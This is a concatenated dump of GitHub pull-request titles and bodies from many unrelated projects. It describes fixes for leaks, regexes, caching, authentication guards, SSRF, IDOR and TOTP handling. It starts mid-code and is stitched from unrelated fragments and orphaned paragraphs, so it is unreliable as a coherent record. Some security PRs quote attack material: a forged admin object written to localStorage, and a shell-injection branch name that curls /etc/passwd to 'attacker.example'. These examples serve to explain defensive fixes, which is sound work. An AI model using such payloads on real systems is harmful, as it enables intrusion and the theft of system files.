}));
localStorage.setItem("loggedInUser", payload);
// Refresh — SecureStorage.getItem returns forged admin object, integrity check passes
```

**The fix** generates a 256-bit cryptographically random key on first use via `crypto.getRandomValues()` and stores it in `sessionStorage`:
- Key is **never hardcoded** in source code
- Key is **different for every browser session** (cleared on tab close)
- Manually editing `localStorage` without the current session key **genuinely fails** HMAC verification
- `SecureStorage` API (`setItem` / `getItem` / `removeItem`) is **unchanged** — no call-site changes needed
- Comment updated to accurately describe what is and is not protected

prs.body:
## 📄 Description

`renderResult()` in `track-order.js` created a `setInterval` for the progress bar animation using `const progressTimer` scoped inside the function. Because `progressTimer` was locally scoped, `resetTracker()` had no reference to it and could never cancel it.

Every time the user clicked "Track Another Order" and submitted again, a new interval was spawned while the previous one kept running. After N lookups: N independent intervals all writing to `#liveProgressBar` every 3 seconds simultaneously, causing jittery/competing updates and wasting resources indefinitely.

- Hoisted `progressTimer` to module scope as `let progressTimer = null`

prs.title: fix: correct broken \d regex in password complexity check (register.js)
prs.body:
## 📄 Description

The password complexity regex in `register.js` used `\\d` inside a regex literal. In a JavaScript regex literal, `\\d` is a literal backslash followed by the letter `d` — not the digit metacharacter `\d`. This caused `complexityRegex.test()` to return `false` for every humanly-typeable password, permanently blocking client-side registration for all users.

Additionally, the password value was `.trim()`-ed before submission, silently stripping leading/trailing whitespace from passwords — a direct violation of NIST SP 800-63B which states passwords must not be modified prior to hashing.

**Changes:**
- `register.js`: `\\d` → `\d` in both the lookahead and character class inside the complexity regex
- `register.js`: Removed `.trim()` from `password` and `confirmPassword` field reads
- Added `tests/unit/register-password-complexity.test.js` with 8 test cases covering all complexity branches

**Verified in console:**
```js
// Broken (was in file):
/^(?=.*\\d).../.test('MyPass1@')  // false — always

// Fixed:
/^(?=.*\d).../.test('MyPass1@')   // true ✓
/^(?=.*\d).../.test('mypass1@')   // false ✓ (no uppercase)
/^(?=.*\d).../.test('MyPass@@')   // false ✓ (no digit)
```

prs.title: fix(model): initialize HNSW index in ContentRecommender.__init__, add hnswlib to deps
prs.body:
## What does this PR do?

The ANN similarity search path in `ContentRecommender.recommend()` was permanently unreachable:

1. `hnswlib` was absent from `requirements.txt`. The module-level `try/import` fell back to `hnswlib = None`, so the index build was never attempted.
2. `_ann_index` and `_ann_enabled` were never set in `__init__`. `getattr(self, '_ann_enabled', False)` always returned `False`, keeping the brute-force path as the permanent fallback even if `hnswlib` was manually installed.

With both gaps in place, every `recommend()` call ran `cosine_similarity(query_vec, self.matrix).flatten()` against the full N-item catalog — O(N) per query.

**Fix:**
- Add `hnswlib>=0.7.0` to `requirements.txt`.
- Initialize `_ann_index = None` and `_ann_enabled = False` in `__init__`.
- Build the HNSW cosine-space index from normalized TF-IDF vectors when `hnswlib` is importable, guarded by a size check (`n_items * dim <= 50_000_000`) to prevent OOM on large catalogs.
- On any build failure or when `hnswlib` is absent, silently falls back to brute-force as before.

## Related issue

Closes #1700

## Type of change

- [x] Bug fix

## How to test this

```bash
python -m pytest tests/test_content_model_ann.py -v
```

All 5 tests pass, covering: hnswlib in requirements, `_ann_index`/`_ann_enabled` initialization, the `hnswlib is not None` guard, the size guard, and that the result loop uses `float(score)` not `float(scores[i])`.

- Event listeners are cleaned up in the `useEffect` return

\`POST /api/customizations/upload\` was validating MIME type via \`file.type\`, which comes directly from the \`Content-Type\` field in the multipart form body — fully client-controlled. prs.body:
## Related Issue

Fixes #2177

## Type of Change

- [x] Bug Fix

## Changes Implemented

Two bugs fixed in `server/controllers/eventRegistrationController.js`.

**Bug 1 — updateTicketToken called with wrong ID**

`updateTicketToken` was called with `result.id || result.registration_id`, where `result` is the object returned by `capacityLockingService.registerForEvent()` — a Supabase row ID. The local PostgreSQL `event_registrations` table generates its own UUID. The `UPDATE event_registrations SET ticket_token =  WHERE id = ` query matched no rows, so `ticket_token` was never written.

Fixed to use `localReg.id` — the ID returned by `registrationsRepository.create()`, which is the actual local PG row.

**Bug 2 — no rollback when local PG insert fails after Supabase capacity decrement**

`capacityLockingService.registerForEvent()` calls the Supabase RPC `register_for_event` which atomically decrements capacity and inserts a row. The subsequent `registrationsRepository.create()` is a separate transaction against a different database connection. If it threw (connection drop, constraint violation, timeout), the Supabase slot was permanently consumed with no local record — the user would get a 500 and then a 409 on retry.

Wrapped the local PG operations in a try/catch. On failure, a compensating `DELETE` is issued to Supabase via PostgREST to remove the orphaned row. This does not restore the capacity counter (that requires a dedicated Supabase `rollback_registration` RPC — noted in the comment for a follow-up), but prevents a ghost registration from permanently blocking the email/event combination.

## Technical Details

### Backend

- `server/controllers/eventRegistrationController.js`: added `supabaseRequest` import, wrapped local PG block in try/catch with compensating delete, fixed `updateTicketToken` to use `localReg.id`

### Frontend / Database / API / Infrastructure

No changes.

- [x] Verified compensating delete path logs and re-throws on PG failure

### Integration Tests

- [ ] Simulate PG failure after Supabase RPC succeeds — assert compensating delete is attempted and error is returned to caller

## Security Review

The compensating Supabase DELETE filters by `event_id` and `email`, both of which are validated and sanitised before this point. No injection risk.

## Accessibility Review

No change to the happy path. The catch block only runs on error.

prs.body:
## What does this PR do?

Both \`arena/submit\` and \`raid/execute\` tracked relic progress with a SELECT-then-UPSERT at the app layer. Two concurrent accepted submissions could both read \`arena_solves: 19\`, both write back \`arena_solves: 20\`, and the counter would get stuck permanently one step behind. Users could cross an unlock threshold and never get the relic.

This adds \`increment_relic_progress(p_developer_id, p_field)\` — a Postgres function that does the increment atomically using \`INSERT ... ON CONFLICT DO UPDATE jsonb_set\`. \`p_field\` is validated against an explicit allowlist inside the function to prevent arbitrary JSON key injection. Both routes now call this RPC instead of doing the read-modify-write themselves, and explicitly handle the returned \`error\` value before checking the new count.

prs.body:
## Related Issue

Fixes #2176

## Type of Change

- [x] Bug Fix

## Changes Implemented

Three targeted changes across two files:

1. **Removed dead subscribe/unsubscribe handlers from `server/routes/notifications.js`** — these handlers stored subscriptions in a module-level `Set` with no DB writes, and were unreachable anyway because the router is mounted at `app.use('/api', notificationsRouter)` which strips the `/api` prefix before path matching, so `router.post('/api/notifications/subscribe', ...)` never matched any request.

2. **Removed `adminAuth` from the live subscribe/unsubscribe handlers in `server/index.js`** (lines 1278, 1301) — push subscription is initiated by browser clients when they call `PushManager.subscribe()`. Gating it on admin auth caused every browser subscription attempt to return 401. The `notificationRateLimiter` and `validatePushSubscription` middleware remain in place.

3. **Added `loadPersistedPushSubscriptions()` to the non-Vercel boot path** — the call existed only in the `VERCEL` branch. Local dev and non-Vercel deployments never hydrated the in-memory mirror from the DB on startup, so subscriptions were lost on every server restart even though `persistPushSubscription()` was correctly writing to the `push_subscriptions` table.

The repository, DB helpers (`persistPushSubscription`, `removePersistedPushSubscription`), and `pushSubscriptionsRepository` were already correct and wired to the index.js handlers — only the auth guard and the missing startup call were broken.

### Backend

- `server/routes/notifications.js`: removed volatile `Set`, `validatePushSubscription` middleware, subscribe and unsubscribe route handlers, and unused `body`/`validationResult` imports (-72 lines)
- `server/index.js`: dropped `adminAuth` from two route definitions, added `loadPersistedPushSubscriptions()` call in non-Vercel boot path (+1 line)

prs.body:
## Description of Changes
**Fixes #1396**

Every route in `src/api/adaptive_auth_routes.py` was publicly accessible — no `X-API-Key` header required, no role check. The only guarded route was `POST /policies` (already had `require_role(Role.ADMIN)`). Everything else was open.

An unauthenticated caller could:
- `POST /evaluate` with any `user_id` → returns risk score and active session ID
- `GET /session/{session_id}` → returns full session: IP, device fingerprint, geolocation, trust score
- `GET /audit` → raw authentication and authorization audit events for any user

**What changed:**

Added `dependencies=[Depends(require_role(Role.X))]` to each unguarded route, following the pattern already used by `POST /policies`:

| Endpoint | Role |
|---|---|
| `/evaluate`, `/challenge`, `/verify`, `/session/*` | ANALYST |
| `/audit`, `/audit/summary` | AUDITOR |
| `/policies` (GET), `/stats`, `/challenge-types` | VIEWER |

Role hierarchy in `security.py` ensures ADMIN and SUPER_ADMIN inherit all of these. AUDITOR cannot call detection endpoints; ANALYST cannot call audit endpoints — least privilege is maintained.

Note: Per-endpoint rate limiting on `/challenge` and `/verify` (also mentioned in the issue) requires extracting the `limiter` instance from `main.py` into a shared module to avoid a circular import. That's a separate change.

Avatar upload used `multer.diskStorage`, which writes the file to disk before any content check. MIME type from the `Content-Type` header is attacker-controlled, so a crafted non-image file could pass `fileFilter` and get written to `uploads/avatars/`. The resume upload pipeline already solved this with `memoryStorage` + magic-byte validation. This PR applies the same pattern to avatars.

prs.title: perf(audit): use sets for event indexes and O(N) reverse instead of Timsort
prs.body:
## Description of Changes
**Fixes #1395**

Three compounding performance bugs in `src/adaptive_auth/audit.py`:

**1. O(N*M) membership test in `query_events`**

`_events_by_user` and `_events_by_session` stored event IDs as `List[str]`. The `in` check in the filter comprehension was O(M) per element, giving O(N*M) total — up to 5 billion comparisons with a full 100k log and a 50k-entry index list. Changed both to `Set[str]`; membership is now O(1).

**2. Unbounded index dicts after `_cleanup_old_events`**

The cleanup called `list.remove(event_id)` but never deleted the dict key when the list became empty. After enough sessions were evicted, both dicts held millions of empty-list entries with no eviction. Switched to `set.discard()` and added `del index_dict[key]` when the set is empty. Also removes the `try/except ValueError` that was needed to guard against double-removal — `discard()` is idempotent.

**3. O(N log N) sort on already-ordered data**

`_audit_log` is append-only in chronological order. `events.sort(key=lambda e: e.timestamp, reverse=True)` was running Timsort on every `/audit` call. Replaced with `list(reversed(events))` — O(N), no allocation for the key function.

## How Has This Been Tested?
- [x] Verified `set.discard()` + empty-key deletion logic manually
- [x] Confirmed `list(reversed(...))` produces the same descending-timestamp order as the sort for an append-only log

prs.title: fix(stepup_auth): replace fake TOTP with pyotp and stabilize per-user secrets
prs.body:
## Description of Changes
**Fixes #1393, #1397**

The step-up TOTP implementation in `src/adaptive_auth/stepup_auth.py` had two critical bugs that made it provide zero real security.

**Bug 1 — secret was completely ignored:**
```python
def _get_expected_totp(self, secret: str) -> str:
    # Simplified TOTP for demo - in production use pyotp
    counter = int(time.time()) // 30
    return str(counter % 1000000).zfill(6)
```
Every user at any moment had the same expected code, trivially computable from the wall clock. The `secret` parameter was silently discarded.

**Bug 2 — secret regenerated on every challenge:**
```_generate_totp_secret`` was called unconditionally on every new challenge, overwriting any previously stored secret. Any user who had enrolled their authenticator app would have their secret silently rotated, permanently breaking their app.

**What changed:**
- `_verify_totp` now uses `pyotp.TOTP(secret).verify(response, valid_window=1)`
- Replaced `_generate_totp_secret` with `_get_or_create_totp_secret` — generates a `pyotp.random_base32()` secret once per user, returns existing on subsequent calls
- `_totp_secrets` changed from a plain unbounded `dict` to `LRUCache(maxsize=100000)`
- Added `revoke_totp_secret()` for explicit re-enrollment
- `setup_totp` now uses `totp.provisioning_uri()` instead of a hand-rolled otpauth string
- Dropped `hashlib`, `hmac`, `random`, `time` imports — no longer used

`pyotp` was already in `requirements.txt` and used correctly in the SaaS auth path. This brings the adaptive auth path to the same standard.

## How Has This Been Tested?
- [x] Verified `pyotp.TOTP(secret).verify(totp.now())` returns `True` in isolation
- [x] Verified `pyotp.TOTP(secret).verify(wrong_code)` returns `False`
- [x] Verified `_get_or_create_totp_secret` returns identical secret on repeated calls for same user
- [x] `flake8` passes with zero warnings

Closes #9615

Adds `submissions/examples/animation-composition-accumulate-sk/` — side-by-side comparison of all three `animation-composition` modes on a card that has both a continuous float and a hover-lift on the same `transform` property.

- `replace` (default) — hover kills the float, card snaps to fixed position

prs.title: fix(interview): prevent concurrent getUserMedia calls from leaking MediaStream
prs.body:
## Summary

\`startRecording\` in \`useInterviewAudio\` had no guard against concurrent invocations. Between calling it and the \`getUserMedia\` promise resolving (100–500ms), \`isRecording\` is still \`false\`, so a second call (double-click, rapid keypress) could enter. The second call overwrites \`mediaRecorderRef.current\` and \`mediaStreamRef.current\`, leaving the first stream's tracks running with no reference to stop them — the browser microphone indicator stays on indefinitely.

## Type of Change

- [x] Bug fix

## Related Issue

Closes #1529

## Changes Made

- Added \`isStartingRef\` (a \`useRef\`) to track when a \`getUserMedia\` call is already in flight
- \`startRecording\` now returns immediately if \`isStartingRef.current\` is \`true\`; sets it to \`true\` on entry and resets it in a \`finally\` block so it clears on both success and error paths
- Wrapped \`startRecording\` in \`useCallback\` with the correct dependency array — it was the only callback in the hook not wrapped, which prevented consumers from stably referencing it

Using a ref (not state) for the in-flight flag is intentional: the check needs to be synchronous and see the current value without a re-render cycle, since the race window is within a single async function execution.

## Validation

- [x] Build passes locally
- [x] Relevant tests added/updated
- [x] Documentation updated (if needed)

## Screenshots (if UI change)

N/A

prs.title: fix(auth): consolidate JWT signing through buildAuthToken in verifyEmail and googleLogin
prs.body:
## Summary

The \`verifyEmail\` and \`googleLogin\` handlers in \`controller.js\` were calling \`jwt.sign()\` directly instead of going through the \`buildAuthToken\` function in \`service.js\`. This meant the \`AppError\` guard for a missing \`JWT_SECRET\` only applied to three of five token issuance paths — the other two would throw a raw \`JsonWebTokenError\` that bypasses the error middleware.

## Type of Change

- [x] Bug fix
- [x] Refactor

## Related Issue

Closes #1528

## Changes Made

- Exported \`buildAuthToken\` from \`service.js\`
- Imported \`buildAuthToken\` in \`controller.js\` alongside the other service imports
- Replaced the \`jwt.sign({...}, process.env.JWT_SECRET, {...})\` blocks in \`verifyEmail\` (previously line 252) and \`googleLogin\` (previously line 351) with \`buildAuthToken(user)\`
- The redundant \`crypto.randomUUID()\` and inline \`JWT_EXPIRES_IN\` fallback logic inside those two handlers are removed — \`buildAuthToken\` handles all of that centrally

\`jwt\` and \`crypto\` imports in the controller are still needed for \`logout\` (\`jwt.decode\`) and \`signOAuthState\` / \`verifyAndDecodeOAuthState\` (\`crypto.randomBytes\`, \`crypto.createHmac\`, \`crypto.timingSafeEqual\`).

prs.title: fix(auth): move localStorage side effects out of Redux reducers into call sites

## Summary

Three reducers in \`authSlice\` were calling \`localStorage.setItem\` / \`sessionStorage.setItem\` directly inside the reducer body, violating Redux's pure function requirement. This causes double-writes in React Strict Mode and breaks Redux DevTools time-travel.

- Added \`persistUser\` helper that updates only the stored user object in whichever storage currently holds the token

prs.title: perf(adaptive_auth): add user→session secondary index to eliminate O(N) scan in get_user_sessions
prs.body:
## Description of Changes
**Fixes #1380**

`get_user_sessions()` iterated the entire `_sessions` LRU cache (up to 100K entries) comparing `session.user_id` on every entry to find sessions for a single user. With 10K active users, the background reassessment loop calling this once per user per cycle produces 10K × 100K = 10^9 comparisons per pass. At that scale, reassessment time exceeds the 300-second interval, so the loop permanently falls behind.

`cleanup_expired_sessions()` had the same issue and also left no footprint — callers had no way to know which user owned which expired session.

Changes:
- Added `self._user_sessions: Dict[str, Set[str]] = defaultdict(set)` — maps `user_id` to the set of their `session_id`s
- `create_session()` adds the new `session_id` to the index
- `terminate_session()` discards the `session_id` from the index on termination
- `cleanup_expired_sessions()` discards each expired session from the index and returns `len(expired)` instead of a manual counter variable
- `get_user_sessions()` now iterates only the user's own session IDs from the index — O(K) where K is concurrent sessions per user, not O(N) total

## How Has This Been Tested?
- [x] Created sessions for two users, verified `_user_sessions` index has correct entries per user
- [x] `get_user_sessions()` returns only sessions belonging to the queried user
- [x] `terminate_session()` removes the session from the index — subsequent `get_user_sessions()` returns one fewer result and index size reflects the removal

## Checklist
- [x] My code follows the style guidelines of this project
- [x] My changes generate no new warnings

prs.title: fix(adaptive_auth): replace unbounded _challenges dict with LRUCache and clean up verification codes on terminal states
prs.body:
## Description of Changes
**Fixes #1378**

`AdaptiveAuthStore._challenges` was a plain `Dict` with no size cap. Every created challenge stayed in memory permanently — `get_challenge()` checked for expiry but never deleted expired entries, and the failure/success paths in `verify_challenge()` only called `update_challenge()` without ever removing anything.

The same problem existed in `StepUpAuthService`: `_verification_codes` and `_callback_pending` were also unbounded plain dicts. Each OTP challenge creation wrote 2 entries into `_verification_codes` that were never cleaned up, even after the challenge expired or the user completed it.

Changes:

**`store.py`**
- `self._challenges` changed from `Dict` to `LRUCache(maxsize=50000)` — same pattern as every other store collection
- Added `cleanup_expired_challenges()` to prune completed/failed/expired/cancelled entries — can be wired into the reassessment background loop

**`stepup_auth.py`**
- `_verification_codes` and `_callback_pending` changed from plain `Dict` to `LRUCache(maxsize=50000)`
- `verify_challenge()` now pops `_verification_codes[challenge_id]`, `_verification_codes[{id}_otp]`, and `_callback_pending[challenge_id]` immediately when the challenge reaches a terminal state (completed or max-attempts exceeded)

## How Has This Been Tested?
- [x] Verified `_challenges`, `_verification_codes`, `_callback_pending` are all `LRUCache` instances with correct maxsize
- [x] Verified `LRUCache.pop(key, None)` does not raise on missing keys
- [x] `cleanup_expired_challenges()` confirmed callable on store instance

## Checklist
- [x] My code follows the style guidelines of this project
- [x] My changes generate no new warnings

prs.title: fix(adaptive_auth): separate RiskScore and AuthenticationDecision into distinct LRU caches
prs.body:
## Description of Changes
**Fixes #1377**

`AdaptiveAuthStore._decisions` was a single `LRUCache` holding two unrelated types: `RiskScore` objects (keyed `{session_id}:{timestamp}`) and `AuthenticationDecision` objects (keyed `{request_id}`). Since auth decisions are written on every request and risk scores accumulate per evaluation, the auth decision writes steadily pushed risk scores toward the LRU eviction boundary.

When `get_latest_risk_score()` ran after eviction, it returned `None`. The caller in `session_evaluator.py` handles `None` by skipping risk adjustment entirely — so a session that had just scored CRITICAL risk would get re-evaluated as if no risk data existed, silently bypassing step-up enforcement.

Changes:
- Added `self._risk_scores: LRUCache = LRUCache(maxsize=max_sessions * 10)` — dedicated cache for `RiskScore` objects with a larger bound (risk scores accumulate faster than decisions)
- `store_risk_score()` writes to `_risk_scores` instead of `_decisions`
- `get_latest_risk_score()` and `get_risk_scores()` now read from `_risk_scores`
- `_decisions` is now type-homogeneous: holds `AuthenticationDecision` only
- `get_stats()` exposes `total_risk_scores` as a separate metric

## How Has This Been Tested?
- [x] Verified `RiskScore` entries land in `_risk_scores` and not in `_decisions`
- [x] Verified `AuthenticationDecision` entries remain in `_decisions`
- [x] `get_latest_risk_score()` retrieves the correct object after the split
- [x] `get_stats()` returns both `total_decisions` and `total_risk_scores`

## Checklist

- [x] My changes generate no new warnings

prs.title: fix(adaptive_auth): snapshot session IDs before async iteration to prevent RuntimeError
prs.body:
## Description of Changes
**Fixes #1379**

`_reassess_active_sessions()` was iterating `self.store._sessions.values()` — a live view of the underlying `OrderedDict` — with `await self.assess_session()` inside the loop body. Each `await` is a yield point where other coroutines can run. If one of those coroutines adds a session and triggers LRU eviction (`__setitem__` → `del self[oldest]`), the `OrderedDict` changes size mid-iteration, raising `RuntimeError: dictionary changed size during iteration`. The existing `except Exception: pass` silently swallowed this, aborting reassessment for all remaining sessions that cycle.

Changes:
- Added `AdaptiveAuthStore.get_active_session_ids()` which materialises a `list` snapshot of active session IDs (`list(self._sessions.items())` produces a copy, safe across await points)
- `_reassess_active_sessions()` now iterates the snapshot instead of the live dict view
- Replaced `except Exception: pass` with `logger.warning(...)` so per-session failures are visible in logs without stopping the loop

## How Has This Been Tested?
- [x] Verified `get_active_session_ids()` returns correct count before and after LRU eviction in a direct functional test
- [x] Imports and module structure validated with `python3 -c` smoke test

## Checklist
- [x] My code follows the style guidelines of this project
- [x] My changes generate no new warnings

prs.title: fix(attack-pipeline): block private/internal IPs to prevent SSRF
prs.body:
## What

The URL check in `app/api/attack-pipeline/route.ts` was a single regex (`^https?:\/\/.+`) that let through `http://localhost`, `http://127.0.0.1`, `http://169.254.169.254` (AWS IMDSv1), and any other private/internal address. An authenticated user could point the scanner at internal infrastructure and get results back.

## Change

Replaced the regex with `new URL()` parsing (which also rejects malformed inputs like `https://` with no host), a protocol allowlist check, and a private-host blocklist covering loopback, RFC-1918, link-local, and IPv6 loopback — all before a scan run is inserted or started.

Closes #123

prs.title: fix(deployer): validate branch name before shell interpolation
prs.body:
## What

`lib/deployer.ts` (line 238) interpolates the user-supplied `branch` value directly into a shell command:

```ts
`git clone --depth 1 --branch ${branch} ${repoUrl} /home/user/repo 2>&1`
```

A crafted branch like `main; curl https://attacker.example/exfil?d=$(cat /etc/passwd)` would execute the injected command inside the E2B sandbox.

## Change

Added a strict allowlist regex check immediately after the branch value is resolved (line 122), before any sandbox is created. Rejects anything containing shell metacharacters.

Closes #122

prs.title: fix(crypto): remove duplicate AES-256-GCM implementation
prs.body:
## What

`lib/crypto.ts` had two independent AES-256-GCM implementations concatenated in the same file, using different key material:
- `encryptSecret`/`decryptSecret` — keyed from `ENCRYPTION_KEY`
- `encrypt`/`decrypt` — keyed from `NEXTAUTH_SECRET` (SHA-256 hashed)

Both produce the same `iv:tag:data` format but cannot decrypt each other's output, which silently throws auth-tag mismatch errors on any cross-function round-trip.

## Change

Removed the second implementation (old lines 88–116) and re-exported `encryptSecret`/`decryptSecret` as `encrypt`/`decrypt` so no callers need to change. Updated the stale comment in `env-store.ts` that still referenced `NEXTAUTH_SECRET`.

Closes #121

prs.title: fix(env-vars): require auth on GET, POST and DELETE handlers
prs.body:
## What

All three handlers in `app/api/env-vars/route.ts` had no authentication checks. Any unauthenticated client could `GET /api/env-vars?project=x&reveal=1` and receive fully decrypted secret values, or call POST/DELETE to write/remove vars for any project.

## Change

Added `auth()` guard at the top of each handler — same pattern already used in `/api/attack-pipeline/route.ts`. Returns 401 before touching any data if the session is missing.

Closes #120

prs.title: fix(GroupPomodoro): clear interval before calling handleTimerComplete
prs.body:
Closes #939

## What

Once `diff` hits 0 it stays 0 on every tick because `Math.max(0, ...)` clamps it. This caused `handleTimerComplete` to fire on every subsequent interval tick until the Supabase state update came back and triggered a re-render.

## Fix

Added `clearInterval(interval)` inside the `if (diff === 0)` block before the `handleTimerComplete()` call. The interval variable is in scope because the `setInterval` return value is assigned to it before the callback can run, so clearing it from within the callback is safe.

prs.title: fix(inference): add LRU eviction to _ThreadSafeCache to cap batch tensor memory
prs.body:
Fixes #1372

## What changed

`_ThreadSafeCache` in `src/inference/production_scorer.py` used a plain `dict` with no eviction. `score_batch()` creates one per batch and shares it across concurrent `score_transaction` calls. For a batch of N transactions with N distinct source accounts, N full subgraph tensor dicts (each containing multiple `torch.Tensor` objects) accumulate simultaneously — none freed until the batch completes. On CUDA this can OOM; on CPU it inflates RSS proportionally to batch size.

Replaced the inner `dict` with an `OrderedDict`-based LRU (`maxsize=256` default):
- `get()` promotes hits to MRU position
- `set()` evicts the LRU entry when over capacity

`maxsize` is a constructor param so callers can tune it. Matches the `LRUCache(maxsize=1000)` pattern already in `check_batch_transactions` in `main.py`.

prs.title: perf(security): cache _get_key_role result to avoid per-request env parse and rehash
prs.body:
Fixes #1370

## What changed

`_get_key_role` was re-reading env vars, re-splitting comma-delimited hash lists, and re-computing `hashlib.sha256` on every authenticated request. With multiple configured roles and keys that's 6+ `os.getenv` syscalls and one SHA-256 per request, none of it cached.

Split the lookup into `_resolve_key_role(provided_hash)` (original logic, takes pre-computed hash) and wrapped it with an LRU cache in `_get_key_role`:

- Keyed on the pre-computed SHA-256 of the incoming key
- TTL: 5 minutes (env vars don't change at runtime)
- Max size: 4096 entries with LRU eviction (bounds growth under a key-spray attack)
- `_invalidate_auth_cache()` added for test isolation

## Testing

Verified import is clean. Unit tests should mock `_resolve_key_role` and assert it's called once per unique key within the TTL window, and called again after TTL expiry or `_invalidate_auth_cache()`.

The name `<input>` and message `<textarea>` in `MessageCTA` used only `placeholder` text as their visible identifier. Placeholder text is not a label — it disappears as soon as the user starts typing, leaving screen readers with no persistent description of what each field is for. This fix adds visually-hidden `<label>` elements linked to each input via `htmlFor`/`id` pairs, and introduces a `.sr-only` utility class in `ContactPage.css` so the labels are read by assistive technology without changing the visual design.

The `htmlFor` / `id` association is the most robust and widely supported labelling method across all screen readers (NVDA, VoiceOver, JAWS).

prs.body:
# Summary

Guards `GET /api/notifications` with `requireStudentAuth` middleware and adds an ownership check so a user can only retrieve their own notifications, closing the IDOR vulnerability where any unauthenticated caller could read any user's data by passing a `userId` query parameter.

## Description

`GET /api/notifications` had no middleware at all, allowing any HTTP client to enumerate another user's notification feed by supplying a known `userId` in the query string. This is an Insecure Direct Object Reference (IDOR) vulnerability — notifications can contain sensitive content such as event confirmations, waitlist promotions, and attendance marks. This fix adds `requireStudentAuth` to verify the caller's identity from the JWT and returns `403 Forbidden` if the requested `userId` does not match the authenticated user.

## Related Issue

- [x] Bug Fix
- [x] Security Enhancement

- Imported `requireStudentAuth` from `../middleware/studentAuthMiddleware.js` in `server/routes/notifications.js`.
- Added `requireStudentAuth` as the second argument to `router.get('/api/notifications', ...)`.
- Inside the handler, extracted the authenticated user's identity from `req.studentUser.sub` / `req.studentUser.id`.
- Returned `403 Forbidden` if the requested `userId` does not match the authenticated user (the `'global'` channel remains accessible to any authenticated user).

## Technical Details

### Backend

`server/routes/notifications.js`

Previously the route had no middleware. The `requireStudentAuth` middleware (already used elsewhere) sets `req.studentUser` from the verified JWT, which is then compared against the query `userId`.

## Testing

- [x] Authenticated request with another user's `userId` → `403 Forbidden`.
- [x] Authenticated request with `userId=global` → `200` (global channel accessible to all logged-in users).

## Security Review

Closes an IDOR (Insecure Direct Object Reference) that allowed any HTTP client to enumerate another user's notification feed without credentials.

### Frontend

`navigator.clipboard.writeText()` returns a `Promise` that rejects when clipboard access is denied or the page is not in a secure context (HTTPS). Without a rejection handler these become unhandled promise rejections visible in DevTools. The fix attaches a `.catch()` to each call site.

## Description

prs.title: fix: replace hardcoded SUPER_ADMIN plaintext check with centralized RBAC auth
prs.body:
Fixes #1343

Both \`src/api/governance_routes.py\` and \`src/api/decision_routes.py\` contained a local \`verify_api_key()\` function that compared the raw \`X-API-Key\` header value against the literal string \`"SUPER_ADMIN"\`. Any caller with knowledge of this placeholder string could gain full access to all AI governance and decision endpoints, bypassing:

- SHA-256 key hashing
- HMAC constant-time comparison (timing-attack resistance)
- Role-based access control from \`security.py\`
- Audit logging

**Fix:** Removed the local \`verify_api_key()\` functions from both files. Added \`dependencies=[Depends(require_role(Role.SUPER_ADMIN))]\` to each protected route decorator, delegating authentication entirely to the centralized \`security.py\` stack. The public \`/health\` endpoints retain no authentication requirement (unchanged behaviour).

## 🧪 How Has This Been Tested?
- [x] Syntax validation: \`python3 -c "import ast; ast.parse(open(f).read())"\` passes on both files
- [x] Confirmed zero remaining \`verify_api_key\` / \`api_key\` references in the modified files
- [x] Confirmed the plaintext \`"SUPER_ADMIN"\` comparison is fully removed
- [x] All route decorators for protected endpoints now carry \`dependencies=[Depends(require_role(Role.SUPER_ADMIN))]\`

## 📸 Proof & Visuals
### Screenshots / Evidence:
Before: `if x_api_key != "SUPER_ADMIN": raise HTTPException(status_code=401, ...)`  
After: `@router.get("/models", dependencies=[Depends(require_role(Role.SUPER_ADMIN))])`

## Summary

`extractApiMessage` in `apiClient.js` recursed through `value.message`, `value.error`, etc. without any depth limit. A deeply nested or self-referential API response payload could cause a stack overflow (`RangeError: Maximum call stack size exceeded`) that crashes the client.

- Added a `MAX_EXTRACT_DEPTH = 10` constant
- Added a `depth` parameter (default `0`) to `extractApiMessage`

- Increments `depth + 1` on every recursive call

## Pull Request Description

Fixes two accessibility and performance bugs in the `ease-scramble` component reported in issue #6081:

1. **Memory leak / wasted CPU** — the `setInterval` driving the scramble animation continued firing at 40ms even when the browser tab was hidden, burning CPU for invisible DOM updates.
2. **Missing `prefers-reduced-motion` guard** — the rapid character-cycling effect ran at full speed for users who have requested reduced motion via OS accessibility settings.

Closes #6081

---

## Type of Change

## Feature Description

**What does this fix?**

Two bugs in `submissions/examples/ease-scramble/`:

- `setInterval` at 40ms continued running while the tab was hidden, wasting CPU on invisible DOM mutations.
- No `prefers-reduced-motion` check existed — users with reduced motion enabled still saw the full rapid scramble effect.

**Changes made:**

`demo.html`:
- Added `prefersReducedMotion` check at init time; if set, `scramble()` immediately writes the final text and returns early.
- Added `if (document.hidden) return;` inside the interval callback so no DOM updates fire while the tab is hidden.
- Added a `visibilitychange` listener that clears all active intervals and restores final text when the tab becomes hidden.

`style.css`:
- Added `@media (prefers-reduced-motion: reduce)` block that disables the `scramble-flicker` CSS animation on `.ease-scramble.scrambling`.

labels.name: type:bug

labels.name: level:intermediate

prs.body:
## What

Fixes five pre-existing TypeScript parse errors in `upstream/main` that caused `npm run check` to exit non-zero on every branch based off main — including all open PRs.

## Why these are parse errors (not semantic)

TypeScript stops full analysis of a file when it encounters a parse error. This means the 35 error lines reported in CI are *first-order* parse failures; fixing them allows `tsc` to reach and report the remaining semantic errors that are separate, pre-existing issues requiring dedicated work.

## Changes

| File | Error | Fix |
|------|-------|-----|
| `server/index.ts` | Merge conflict markers at line 249 (TS1185) | Resolved in favour of `safeExecML`, which is already imported; the `execFileAsync` branch was stale |
| `server/services/mlService.ts` | Orphaned `runAssessmentInference` stub left `PythonDaemonManager` class nested inside an unclosed function body (TS1005 at EOF) | Removed the orphaned stub; also removed `console.log("DEBUG: …")` calls in both inference functions that were leaking patient data |
| `client/src/components/ui/chart.tsx` | Unterminated template literal in `ChartStyle` `dangerouslySetInnerHTML.__html` (TS1160) | Rewrote template as a clean single-level tagged template; output CSS is identical |
| `client/src/pages/MyHealth.tsx` | Duplicate `<TableHeader>` / `<TableBody>` blocks producing mismatched JSX closing tags (TS17002 cascade) | Removed the incomplete first copy; kept the improved version with accessible `min-h-[44px]` touch targets |
| `server/queue.ts` | Two nested `if` blocks for SIGTERM/timeout detection with incorrect bracing (TS1128/TS1109) | Merged conditions into a single guard |

## Testing

Ran `npm run check` on `upstream/main` (stashed) → **35 error lines (parse errors only)**.  
After this fix → parse errors gone; remaining output is pre-existing semantic errors that were previously hidden behind the parse failures and need separate attention.

## Related

Mentioned in the reply to maintainer feedback on #1186 — committed to opening this PR to resolve the merge conflict and other parse errors so CI can pass cleanly.

prs.body:
## Description

